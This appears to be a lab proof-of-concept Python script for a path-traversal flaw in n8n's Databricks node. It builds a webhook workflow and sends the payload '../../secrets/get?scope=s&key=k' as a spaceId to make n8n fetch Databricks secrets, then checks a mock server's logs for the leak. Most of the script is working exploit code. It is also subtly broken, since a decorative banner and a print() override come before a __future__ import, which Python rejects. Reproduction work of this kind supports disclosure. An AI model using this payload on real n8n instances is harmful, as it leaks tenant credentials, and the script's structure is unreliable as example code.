#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: n8n-databricks-path-join (High: 8.6)
#  Vendor: n8n (n8n GmbH)
#  Versions: n8n <= 2.42.0
#  Impact: Credential leak on Databricks tenant
#  Requires: unauthenticated POST /webhook/dbx-space
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "n8n-databricks-path-join"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

from __future__ import annotations

import http.cookiejar
import json
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
N8N = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18202").rstrip("/")
MOCK = (sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:18203").rstrip("/")
EMAIL = "labadmin@localhost.invalid"
PASSWORD = "LabPass123!"
WITNESS = "N8N-DBX-SECRET-WITNESS"
PAYLOAD_SPACE = "../../secrets/get?scope=s&key=k"
WEBHOOK_PATH = "dbx-space"
CTX = ssl._create_unverified_context()

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cj),
    urllib.request.HTTPSHandler(context=CTX),
)


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(msg: str) -> None:
    log(msg)
    log("FAIL N8N-DBX-PATH-JOIN")
    raise SystemExit(1)


def http(
    method: str,
    url: str,
    data: object | None = None,
    headers: dict[str, str] | None = None,
    timeout: int = 60,
    raw: bytes | None = None,
) -> tuple[int, str, dict[str, str]]:
    hdrs = {"User-Agent": "n8n-databricks-path-join-lab", "Accept": "application/json"}
    if headers:
        hdrs.update(headers)
    body = raw
    if data is not None:
        body = json.dumps(data).encode()
        hdrs.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    try:
        with opener.open(req, timeout=timeout) as resp:
            text = resp.read().decode("utf-8", "replace")
            return resp.status, text, {k.lower(): v for k, v in resp.headers.items()}
    except urllib.error.HTTPError as exc:
        text = exc.read().decode("utf-8", "replace")
        return exc.code, text, {k.lower(): v for k, v in exc.headers.items()}


def unwrap(text: str) -> object:
    try:
        obj = json.loads(text)
    except json.JSONDecodeError:
        return text
    if isinstance(obj, dict) and "data" in obj:
        return obj["data"]
    return obj


def compose(*args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", *args],
        cwd=HERE,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )


def confirm_n8n_version() -> str:
    inspect = subprocess.run(
        [
            "docker",
            "inspect",
            "-f",
            "{{.Config.Image}} {{index .Config.Labels \"org.opencontainers.image.version\"}} {{range .Config.Env}}{{println .}}{{end}}",
            "n8n-databricks-path-join-n8n-1",
        ],
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )
    blob = (inspect.stdout or "") + (inspect.stderr or "")
    env = compose("exec", "-T", "n8n", "printenv", "N8N_VERSION")
    version = (env.stdout or "").strip()
    if not version:
        for line in blob.splitlines():
            if line.startswith("N8N_VERSION="):
                version = line.split("=", 1)[1].strip()
                break
    log(f"IOC n8n-image={blob.splitlines()[0] if blob.strip() else 'unknown'}")
    log(f"IOC n8n-version={version or 'unknown'}")
    if version and version != "2.42.0":
        fail(f"expected n8n 2.42.0, got {version}")
    if "2.42.0" not in blob and version != "2.42.0":
        # Image tag is the pin when the container omits N8N_VERSION.
        img = compose("images", "n8n", "--format", "{{.Tag}}")
        tag = (img.stdout or "").strip()
        log(f"IOC n8n-tag={tag}")
        if tag and tag != "2.42.0":
            fail(f"expected image tag 2.42.0, got {tag}")
    return version or "2.42.0"


def setup_owner() -> None:
    last = ""
    for i in range(30):
        code, text, _ = http(
            "POST",
            f"{N8N}/rest/owner/setup",
            {
                "email": EMAIL,
                "firstName": "Lab",
                "lastName": "Admin",
                "password": PASSWORD,
            },
        )
        last = f"{code} {text[:300]}"
        if code in (200, 201):
            log("IOC owner-setup=ok")
            return
        if code == 400 and "already" in text.lower():
            log("IOC owner-already-setup")
            return
        if code in (404, 502, 503):
            log(f"IOC owner-setup-wait i={i} http={code}")
            time.sleep(2)
            continue
        fail(f"owner setup failed: {last}")
    fail(f"owner setup not ready: {last}")


def login() -> None:
    code, text, _ = http(
        "POST",
        f"{N8N}/rest/login",
        {"emailOrLdapLoginId": EMAIL, "password": PASSWORD},
    )
    if code != 200:
        fail(f"login failed: {code} {text[:300]}")
    log("IOC login=ok")


def create_credential() -> tuple[str, str]:
    code, text, _ = http(
        "POST",
        f"{N8N}/rest/credentials",
        {
            "name": "Databricks mock",
            "type": "databricksApi",
            "data": {
                "host": "http://mock:8080",
                "token": "dapi-lab-dummy-token",
            },
        },
    )
    if code not in (200, 201):
        fail(f"create credential failed: {code} {text[:400]}")
    data = unwrap(text)
    if not isinstance(data, dict) or not data.get("id"):
        fail(f"credential response missing id: {text[:400]}")
    cred_id = str(data["id"])
    cred_name = str(data.get("name") or "Databricks mock")
    log(f"IOC credential-id={cred_id}")
    return cred_id, cred_name


def create_workflow(cred_id: str, cred_name: str) -> tuple[str, str]:
    webhook_id = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"
    workflow = {
        "name": "dbx-genie-space-webhook",
        "nodes": [
            {
                "parameters": {
                    "httpMethod": "POST",
                    "path": WEBHOOK_PATH,
                    "responseMode": "lastNode",
                    "responseData": "firstEntryJson",
                    "options": {},
                },
                "id": "11111111-1111-4111-8111-111111111111",
                "name": "Webhook",
                "type": "n8n-nodes-base.webhook",
                "typeVersion": 2.2,
                "position": [0, 0],
                "webhookId": webhook_id,
            },
            {
                "parameters": {
                    "authentication": "accessToken",
                    "resource": "genie",
                    "operation": "getSpace",
                    "spaceId": "={{ $json.body.spaceId }}",
                },
                "id": "22222222-2222-4222-8222-222222222222",
                "name": "Get Space",
                "type": "n8n-nodes-base.databricks",
                "typeVersion": 1,
                "position": [280, 0],
                "credentials": {
                    "databricksApi": {
                        "id": cred_id,
                        "name": cred_name,
                    }
                },
            },
        ],
        "connections": {
            "Webhook": {
                "main": [[{"node": "Get Space", "type": "main", "index": 0}]]
            }
        },
        "settings": {"executionOrder": "v1"},
        "pinData": {},
        "meta": None,
    }
    code, text, _ = http("POST", f"{N8N}/rest/workflows", workflow)
    if code not in (200, 201):
        fail(f"create workflow failed: {code} {text[:500]}")
    data = unwrap(text)
    if not isinstance(data, dict) or not data.get("id") or not data.get("versionId"):
        fail(f"workflow response missing ids: {text[:500]}")
    wf_id = str(data["id"])
    version_id = str(data["versionId"])
    log(f"IOC workflow-id={wf_id}")
    log(f"IOC version-id={version_id}")
    return wf_id, version_id


def activate(wf_id: str, version_id: str) -> None:
    code, text, _ = http(
        "POST",
        f"{N8N}/rest/workflows/{wf_id}/activate",
        {"versionId": version_id},
    )
    if code not in (200, 201):
        fail(f"activate workflow failed: {code} {text[:500]}")
    log("IOC workflow-active=ok")


def mock_logs() -> str:
    code, text, _ = http("GET", f"{MOCK}/__logs", timeout=10)
    if code != 200:
        return f"(mock logs http={code} body={text[:200]})"
    return text


def attack() -> tuple[int, str]:
    last = (0, "")
    for i in range(20):
        code, text, _ = http(
            "POST",
            f"{N8N}/webhook/{WEBHOOK_PATH}",
            {"spaceId": PAYLOAD_SPACE},
            timeout=90,
        )
        last = (code, text)
        log(f"IOC webhook-http={code} attempt={i} body={text[:400]!r}")
        if code != 404:
            return last
        time.sleep(1)
    return last


def path_escaped(logs: str) -> bool:
    return (
        "..%2F" in logs
        or "%2e%2e" in logs.lower()
        or "/genie/spaces/..%2F" in logs
        or "/genie/spaces/%2e%2e" in logs.lower()
    )


def secrets_get_hit(logs: str) -> bool:
    for line in logs.splitlines():
        if not line.startswith("GET "):
            continue
        target = line[4:].split(" ", 1)[0]
        path = target.split("?", 1)[0]
        if path.rstrip("/") == "/api/2.0/secrets/get":
            return True
    return False


def stayed_in_genie(logs: str) -> bool:
    interesting = [
        ln
        for ln in logs.splitlines()
        if ln.startswith(("GET ", "POST ", "PUT ", "HEAD "))
        and "/__logs" not in ln
        and "/health" not in ln
    ]
    if not interesting:
        return True
    return all("/genie/spaces/" in ln for ln in interesting)


def main() -> None:
    log("IOC langchain-negative=skipped VectorStoreDatabricks uses toPathSegment; not wired")
    confirm_n8n_version()
    setup_owner()
    login()
    cred_id, cred_name = create_credential()
    wf_id, version_id = create_workflow(cred_id, cred_name)
    activate(wf_id, version_id)
    time.sleep(1)
    code, body = attack()
    logs = mock_logs()
    log("IOC mock-access-log<<<")
    log(logs.rstrip() or "(empty)")
    log("IOC mock-access-log>>>")

    body_has_witness = WITNESS in body
    log(f"IOC webhook-witness={body_has_witness}")
    log(f"IOC mock-secrets-get={secrets_get_hit(logs)}")

    if path_escaped(logs):
        fail("path kept encoded under /genie/spaces/")
    if not secrets_get_hit(logs) and not body_has_witness:
        if stayed_in_genie(logs):
            fail("n8n never left /api/2.0/genie/spaces/")
        fail("no GET /api/2.0/secrets/get and no witness in webhook body")

    secret_line = next(
        (
            ln
            for ln in logs.splitlines()
            if ln.startswith("GET ")
            and ln[4:].split("?", 1)[0].rstrip("/") == "/api/2.0/secrets/get"
        ),
        "GET /api/2.0/secrets/get",
    )
    log(f"IOC mock-request-line={secret_line}")
    log(f"IOC witness={WITNESS}")
    log("SUCCESS N8N-DBX-PATH-JOIN")


if __name__ == "__main__":
    main()

